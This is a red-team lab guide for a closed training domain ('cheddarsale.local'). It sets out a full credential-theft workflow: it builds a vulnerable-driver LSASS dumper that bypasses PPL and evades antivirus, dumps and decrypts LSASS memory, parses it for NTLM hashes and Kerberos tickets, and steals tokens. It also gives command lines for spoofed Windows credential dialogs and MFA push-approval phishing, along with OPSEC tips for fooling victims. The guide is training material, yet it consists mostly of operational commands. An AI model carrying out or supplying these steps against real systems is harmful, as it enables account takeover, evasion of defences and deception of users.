# LAB 7 — Credential Theft / User Impersonation

> This lab requires a SYSTEM beacon from LAB 5. Ensure you have an active SYSTEM-level agent on WS01 before proceeding.

---

## Task 1 — Build Doppelganger

Doppelganger is a BYOVD (Bring Your Own Vulnerable Driver) LSASS dumper that uses RTCore64.sys to bypass PPL (Protected Process Light) and XOR-encrypts the dump to evade AV detection.

- On the Windows 11 VM, open **x64 Native Tools Command Prompt for VS 2022** and build the project:
    - Open `C:\DevTools\RedTeamGrimoire\Doppelganger\DoppelgangerXObolos\DoppelgangerXObolos.sln` in Visual Studio 2022
    - Retarget the platform toolset — use either method:
        - **Option 1 (GUI):** Right-click the project → `Properties` → `Configuration Properties` → `General` → change `Platform Toolset` from `v145` to `v143` → `Apply` → `OK`
        - **Option 2 (Edit project file):** `Project` → `Edit Project File` → `Ctrl+H` → replace `v145` with `v143` → save → right-click `Doppelganger` in `Solution Explorer` → `Reload Project`
    - Rebuild the solution (`Build` → `Rebuild Solution`)
    - Confirm the output at `C:\DevTools\RedTeamGrimoire\Doppelganger\DoppelgangerXObolos\x64\Release\Doppelganger.exe`

- Copy the compiled binary from WS01 to the Kali loot directory:
```bash
mkdir -p ~/AdaptixProjects/<YOUR PROJECT>/loot
scp vagrant@192.168.57.31:C:/DevTools/RedTeamGrimoire/Doppelganger/DoppelgangerXObolos/x64/Release/Doppelganger.exe ~/AdaptixProjects/<YOUR PROJECT>/loot/
```

---

## Task 2 — Dump LSASS

> Confirm you are operating from a SYSTEM beacon before uploading. Use `getuid` to verify.

- From the SYSTEM beacon, upload Doppelganger and the vulnerable driver to a writable location:
```bash
beacon> getuid
beacon> upload ~/AdaptixProjects/<YOUR PROJECT>/loot/Doppelganger.exe C:\Users\Public\Doppelganger.exe
beacon> upload /opt/RedTeamGrimoire/Doppelganger/utils/RTCore64.sys C:\Users\Public\RTCore64.sys
beacon> ls C:\Users\Public
```  
> Doppelganger read from and writes to `C:\Users\Public`, this can be changed in the source code.  

- Execute Doppelganger — it loads the driver, bypasses PPL, and dumps LSASS to an XOR-encrypted file:
```bash
beacon> ps run C:\Users\Public\Doppelganger.exe
```

- Download the dump file and sync it to the loot directory on Kali:
```bash
beacon> ls C:\Users\Public
beacon> download C:\Users\Public\doppelganger.dmp  
# Note: this is a large file, you can watch the progress on the downloads page.
```
    - Click the downloads icon in the Adaptix client
    - Sync the file to `~/AdaptixProjects/<YOUR PROJECT>/loot/`

---

## Task 3 — Decrypt and Parse the Dump

- On Kali, decrypt the XOR-encrypted dump:
```bash
python3 /opt/RedTeamGrimoire/Doppelganger/utils/decrypt_xor_dump.py ~/AdaptixProjects/<YOUR PROJECT>/loot/doppelganger.dmp
```
This produces `doppelganger.dmp.dec` in the same directory.

- Parse the decrypted dump with pypykatz to extract credentials and Kerberos tickets:
```bash
mkdir -p $HOME/kerb
pypykatz lsa minidump ~/AdaptixProjects/<YOUR PROJECT>/loot/doppelganger.dmp.dec -o dump_out -k kerb -p all
```

- Review the output for plaintext passwords, NTLM hashes, and Kerberos tickets.  
```bash
cat dump_out
pypykatz kerberos ccache list $HOME/kerb/<ccache file>
```
---

## Task 4 — Token Impersonation

With credentials in hand, there are two ways to impersonate another user from an active beacon.

The target user is `devin.aguirre` — a local administrator on WS01 whose password (`9i*mZrk4Jx8UrIY`) was found in their LDAP description field during LAB 4/6 enumeration and confirmed as a valid admin credential during the LAB 6 password spray.

The logon type controls how credentials are used:
| Type | Name | Use case |
|------|------|----------|
| 2 | Interactive | Full local + network access |
| 3 | Network | Network only, no local resources |
| 8 | NetworkCleartext | Network logon, credentials sent in cleartext |
| 9 | NewCredentials | Local access as self, network access as target user |

Type `9` (NewCredentials) is the most common for lateral movement — it behaves like `runas /netonly`, keeping local access under the current token while using the target's credentials for any network authentication.

### Part 1 — token make (credentials required)

```bash
beacon> token make devin.aguirre 9i*mZrk4Jx8UrIY cheddarsale.local 9
```

Verify the impersonation:
```bash
beacon> whoami
beacon> getuid
```

Revert to the original token when done:
```bash
beacon> rev2self
```

### Part 2 — token steal (session required)

`devin.aguirre` has an `ITManagementConsole` scheduled task (created in LAB 5) that runs `mmc.exe` at logon under their credentials — they will always have an active process on WS01. Find the PID and steal the token:

```bash
beacon> ps list
beacon> token steal <mmc.exe PID>
```

Verify the impersonation:
```bash
beacon> whoami
beacon> getuid
```

Revert to the original token when done:
```bash
beacon> rev2self
```

> **Note:** `token steal` requires the target user to have a running process on the host. `token make` only requires valid credentials and works even if the user is not logged in. Complete both parts — each demonstrates a different access path to the same credential material. Both require an elevated beacon.


**Questions:**  
- What does each command (`whoami`, `getuid`) report after `token make` vs `token steal` — and what does the difference tell you about how each technique impersonates the target user?


---

## Task 5 — Credential Prompting and MFA Bypass

These techniques target the human rather than the system — prompting the logged-in user to hand over credentials or approve an MFA push. Both require an active beacon on the target host with the user's desktop session accessible.

### Part 1 — askcreds

`askcreds` renders a fake Windows credential dialog on the target's screen. The default prompt mimics a network reconnection dialog, but the text can be customized to match the environment and increase believability.

For each execution below, observe:
- **Beacon** — If the task blocks waiting for input or returns immediately, and what output is returned when credentials are submitted or the dialog times out
- **Windows 11 VM** — how the dialog appears on screen, what title and message text are shown, and how it changes between the default and custom prompts

- Run with default prompt (waits 30 seconds for input):
```bash
beacon> askcreds
```  

- Cancel the request on the Windows 11 VM  

- Run with a custom prompt to match the environment:
```bash
beacon> askcreds -p "Windows Security" -n "Your session has expired. Please re-enter your credentials to continue." -t 60
```  

- Cancel the request on the Windows 11 VM 

- Run with `--async`:
```bash
beacon> askcreds --async -p "Windows Security" -n "Your session has expired. Please re-enter your credentials to continue."
```

On the WS01 desktop, the credential dialog will appear. Enter `seth.hawkins` and their password (`ChangeMe1234!@#$`) to simulate a user responding to the prompt.

### Part 2 — ask_mfa

`ask_mfa` displays a convincing MFA number-matching prompt on the target's screen. This is used to trick the user into approving an MFA push the attacker has already triggered — the attacker initiates authentication to a target service (Azure, VPN, etc.), receives the MFA number, then displays that same number to the victim so they approve it.

```bash
beacon> ask_mfa 42
```


**Questions:**
- Will askcreds lockup the beacon while in use?
- What is returned in the beacon output after the credentials are submitted, and in what format?
- When credentials are recived from askcreds are they stored in the "Credentials"?  
- Will `ask_mfa` work with OTP codes from authenticator apps? 


   
## Answers  

<details>
<summary>Task 4 — Token Impersonation</summary>

- What does each command (`whoami`, `getuid`) report after `token make` vs `token steal` — and what does the difference tell you about how each technique impersonates the target user?

  **`token make` (logon type 9 / NewCredentials):**
  - Both `whoami` and `getuid` still report `NT AUTHORITY\SYSTEM` — the local process identity is unchanged.
  - The impersonated credentials are only applied to outbound network authentication. Locally, you are still SYSTEM.

  **`token steal`:**
  - Both `whoami` and `getuid` report `CHEDDARSALE\devin.aguirre` — the stolen token fully replaces the thread token.
  - Local and network identity both appear as the target user.

  This is why logon type 9 is useful for lateral movement: you keep SYSTEM privileges locally while using the target's credentials for any network access. `token steal` is a true impersonation — you become that user on the host.

  > **Note:** `token make` with logon type 2 (Interactive) behaves like `token steal` — both `whoami` and `getuid` will report the target user for local and network identity, since an interactive logon creates a full impersonation token rather than a credentials-only overlay.

</details>

---

<details>
<summary>Task 5</summary>

- Will askcreds lockup the beacon while in use? 
Yes, however `--async` frees the beacon immediately rather than blocking until the dialog times out or the user responds.  
- What is returned in the beacon output after the credentials are submitted, and in what format?  
The username and password in plaintext  
- When credentials are recived from askcreds are they stored in the "Credentials"?  
No, the credentials must be manually added from `askcreds`  
- Will `ask_mfa` work with OTP codes from authenticator apps?  
No, it will only work with push notifications.  

> :no_entry: ***OPSEC:*** The number displayed must match the push notification the attacker triggered or the user will see a mismatch and may report it. Coordinate timing — trigger the MFA push first, then immediately run `ask_mfa` with the matching number before the push expires.

</details>


## Troublshooting  
### C++ Development Missing

- Obtain password policy:
```powershell
runas /user:vagrant powershell.exe
```
```powershell
Enable-NetAdapter -Name Ethernet0
Start-Process "C:\Program Files (x86)\Microsoft Visual Studio\Installer\setup.exe"
```

- Install Desktop development with C++

